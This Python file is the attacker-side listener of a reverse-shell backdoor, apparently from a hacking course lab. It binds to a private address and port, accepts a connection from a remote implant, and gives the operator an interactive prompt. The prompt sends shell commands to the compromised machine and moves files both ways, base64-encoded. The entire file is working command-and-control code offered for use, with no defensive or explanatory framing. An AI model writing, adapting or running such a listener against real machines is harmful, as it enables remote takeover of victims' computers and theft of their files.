import base64
import socket
import simplejson

class SocketListener:
    def __init__(self,ip,port):
        myListener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        myListener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        myListener.bind((ip, port))
        myListener.listen(0)
        print("Listening...")
        (self.myConnection, myAddress) = myListener.accept()
        print("Connection OK from " + str(myAddress))

    def jsonSend(self, data):
        jsonData = simplejson.dumps(data)
        self.myConnection.send(jsonData.encode("utf-8"))

    def jsonReceive(self):
        jsonData = ""
        while True:
            try:
                jsonData = jsonData + self.myConnection.recv(1024).decode()
                return simplejson.loads(jsonData)
            except ValueError:
                continue

    def commandExecution(self,commandInput):
        self.jsonSend(commandInput)

        if commandInput[0] == "quit":
            self.myConnection.close()
            exit()

        return self.jsonReceive()

    def saveFile(self, path, contents):
        with open(path, "wb") as myFile:
            myFile.write(base64.b64decode(contents))
            return "Download OK"

    def getFile(self,path):
        with open(path,"rb") as myFile:
            return base64.b64encode(myFile.read())

    def startListener(self):
        while True:
            commandInput = input("Enter command: ")
            commandInput = commandInput.split(" ")
            try:
                if commandInput[0] == "upload":
                    myFileContent = self.getFile(commandInput[1])
                    commandInput.append(myFileContent)

                commandOutput = self.commandExecution(commandInput)

                if commandInput[0] == "download" and "Error!" not in commandOutput:
                    commandOutput = self.saveFile(commandInput[1],commandOutput)
            except Exception:
                commandOutput = "Error"
            print(commandOutput)

mySocketListener = SocketListener("10.0.2.10",8080)
mySocketListener.startListener()